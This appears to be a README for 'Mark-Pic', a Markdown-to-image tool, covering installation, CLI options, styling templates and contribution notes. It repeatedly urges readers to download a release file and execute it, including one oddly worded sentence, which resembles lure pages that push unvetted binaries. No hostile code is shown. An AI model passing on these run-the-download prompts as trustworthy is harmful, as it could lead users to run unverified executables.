# Mark-Pic — Modern Markdown to Image Tool with Live Preview

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ahmedpracha/mark-pic/releases)

![hero](https://raw.githubusercontent.com/github/explore/main/topics/markdown/markdown.png)

Mark-Pic converts Markdown into high-quality images. It provides a real-time preview, flexible styling, and one-click export. Use it to share code snippets, notes, README sections, diagrams, and blog hero images.

Features
- Live preview. See the rendered image as you type.
- Custom styles. Choose fonts, themes, margins, and background.
- Export formats. PNG, JPEG, and SVG.
- High DPI exports for print and social media.
- Built-in templates for code, blog headers, notes, and slides.
- Command-line interface for automation and batch exports.
- Clipboard copy and drag-and-drop support.
- Local-first. Runs on your machine, no cloud required.

Quick demo
![demo-gif](https://raw.githubusercontent.com/ahmedpracha/mark-pic/main/assets/demo.gif)

Why use Mark-Pic
- Create shareable visuals from Markdown.
- Preserve syntax highlighting and layout.
- Generate marketing, documentation, and tutorial images.
- Automate image generation in CI or content pipelines.

Install

Download the release for your platform from the Releases page:
https://github.com/ahmedpracha/mark-pic/releases

Because the link includes a path, download the appropriate release file and execute it.

Linux
- Download the AppImage or .tar.gz.
- Make it executable and run:
  chmod +x mark-pic-x.y.z.AppImage
  ./mark-pic-x.y.z.AppImage

macOS
- Download the .dmg or .zip.
- Open the .dmg and drag Mark-Pic to Applications.
- Run Mark-Pic from Applications.

Windows
- Download the .exe installer.
- Run the installer and follow the prompts.
- Launch Mark-Pic from the Start menu.

If the release link fails, check the Releases section on the repository page:
https://github.com/ahmedpracha/mark-pic/releases

CLI install
- Homebrew (macOS/Linux):
  brew tap ahmedpracha/mark-pic
  brew install mark-pic
- Scoop (Windows):
  scoop bucket add mark-pic https://github.com/ahmedpracha/scoop-mark-pic
  scoop install mark-pic

Usage

GUI mode
- Open Mark-Pic.
- Paste or write Markdown in the left editor.
- See the rendered preview on the right.
- Adjust style settings in the right panel.
- Click Export to save a PNG, JPEG, or SVG.

Common UI controls
- Theme: light, dark, or custom CSS.
- Font: system fonts and bundled web fonts.
- Size: width, height, and device presets (Twitter, Instagram, Blog).
- Scale: 1x, 2x, 3x for high DPI.
- Padding and line-height controls.

CLI mode
- Convert a single file:
  mark-pic convert README.md --out output.png
- Batch convert:
  mark-pic convert docs/*.md --out-dir images/
- Set style from a JSON file:
  mark-pic convert README.md --style styles/article.json --out article.png
- Export SVG:
  mark-pic convert diagram.md --format svg --out diagram.svg
- Use templates:
  mark-pic convert post.md --template hero --out hero.png

CLI options
- --out, -o: output file path
- --format, -f: png | jpg | svg
- --scale, -s: 1 | 2 | 3
- --width, -w: output width in px
- --height, -h: output height in px
- --style: path to style JSON or CSS
- --template: template name
- --headless: run without opening GUI (useful in CI)
- --watch: watch source files and regenerate on change

Styling and templates

Style file structure (JSON)
{
  "fontFamily": "Inter, Menlo, monospace",
  "fontSize": 16,
  "theme": "dark",
  "background": "#0b1220",
  "padding": 32,
  "lineHeight": 1.6,
  "codeStyle": {
    "theme": "dracula",
    "showLineNumbers": false
  }
}

CSS support
- You can pass a CSS file to control the final render.
- Use CSS variables for colors and spacing.
- Append custom fonts via @font-face.

Built-in templates
- code: compact code block with syntax highlight.
- hero: large title, subtitle, and background.
- note: compact note card with shadow.
- slide: widescreen title slide.

Examples

Create a blog hero
1. Write a short Markdown file:
   # How to write fast docs
   _A practical guide to clear documentation._
2. Use the hero template:
   mark-pic convert hero.md --template hero --out hero.png --width 1600 --scale 2

Share a code snippet on social
1. Copy code to snippet.md with triple backticks.
2. Convert with code template:
   mark-pic convert snippet.md --template code --out snippet.png --format png

Automate in CI
- Add a step in your CI pipeline:
  - run: mark-pic convert README.md --out README-preview.png --headless
- Commit the generated images to the site or release assets.

Integration tips
- Use the headless CLI in GitHub Actions to build hero images from post metadata.
- Generate documentation badges and shareable snippets during build.
- Combine with templating tools to create personalized social cards.

Performance and formats
- PNG for transparent backgrounds and pixel-accurate renders.
- JPEG for photographic backgrounds and smaller files.
- SVG for infinitely scalable vector text and shapes.
- Use the --scale option for high-DPI exports.

Export presets
- Twitter card: 1024x512
- Blog header: 1600x900
- Instagram post: 1080x1080
- Slide: 1920x1080

Example presets (CLI)
mark-pic convert post.md --out post-twitter.png --width 1024 --height 512 --scale 2

Accessibility
- Exports preserve alt text for images embedded in Markdown.
- You can add metadata and titles for SVG output.

Troubleshooting
- If fonts look wrong, ensure the font is installed or included via @font-face.
- If images render blank, increase the timeout for external resources.
- If the app fails to start after download, check permissions and try running from the terminal.

Releases and updates

Download the release file and execute it from the Releases page:
https://github.com/ahmedpracha/mark-pic/releases

Each release includes platform-specific binaries and checksums. Follow the release notes for breaking changes and upgrade steps.

Security
- Binaries are signed where supported.
- Check checksums in the release notes.
- Run headless mode in CI for deterministic builds.

Contributing

How to contribute
- Fork the repo.
- Create a feature branch.
- Add tests or examples.
- Open a pull request with a clear description.

Developer setup
- Install Node.js 16+.
- Install dependencies:
  npm install
- Run the app in dev mode:
  npm run dev
- Run tests:
  npm test

Architecture overview
- Renderer: converts HTML/CSS to image using headless Chromium.
- Editor: Markdown editor with syntax highlight and live preview.
- CLI: thin wrapper that exposes conversion and template options.
- Templates: JSON + CSS that control layout and branding.

Testing
- Unit tests for parsing and options.
- Visual tests for templates and export formats.
- CI runs headless conversion and compares images to baselines.

License
- MIT License. See LICENSE file.

Acknowledgments
- Uses headless Chromium for rendering.
- Uses Prism or Shiki for code highlighting.
- Uses open source fonts and icon sets.

Contact
- Open issues and pull requests on the repository.
- Report bugs with a minimal reproduction and the logs.

Assets and images used in this README
- Markdown icon: https://raw.githubusercontent.com/github/explore/main/topics/markdown/markdown.png
- Demo GIF: assets/demo.gif (bundled with releases)
- Badges: https://img.shields.io

Badges
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ahmedpracha/mark-pic/releases)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

Get the release file from the Releases page and run it:
https://github.com/ahmedpracha/mark-pic/releases

Contributors
- Ahmed Pracha — initial work and maintainer
- Community — templates, translations, and bug reports

Project roadmap
- Add cloud sync for team templates.
- Add plugin system for custom renderers.
- Improve mobile and tablet export presets.

How to report bugs
- Create an issue with steps to reproduce.
- Attach the input Markdown and the used style or template.
- Include the output image if possible.

How to request features
- Open an issue with a clear use case.
- Provide a mock or sketch of the desired output.
- Explain the expected workflow and CLI behavior.

Licenses for bundled assets
- Fonts and icons include proper attributions in the assets folder.
- Check the releases for details on bundled asset licenses.

Start using Mark-Pic now. Download the installer for your platform here:
https://github.com/ahmedpracha/mark-pic/releases